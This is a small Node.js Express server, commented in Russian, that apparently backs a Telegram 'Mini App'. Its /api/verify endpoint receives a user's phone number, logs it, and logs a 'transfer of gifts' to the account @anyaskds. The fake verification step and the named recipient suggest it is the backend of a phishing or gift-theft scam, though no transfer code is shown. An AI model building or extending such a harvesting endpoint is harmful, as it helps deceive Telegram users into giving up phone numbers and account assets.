const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Раздаем статику
app.use(express.static(path.join(__dirname)));
app.use(express.json());

// Главная страница - твой Mini App
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Принимаем данные от Mini App
app.post('/api/verify', (req, res) => {
    console.log('📱 Получен номер:', req.body.phone);
    console.log('🎁 Передача подарков на @anyaskds');
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`✅ Mini App запущен: http://localhost:${PORT}`);
});
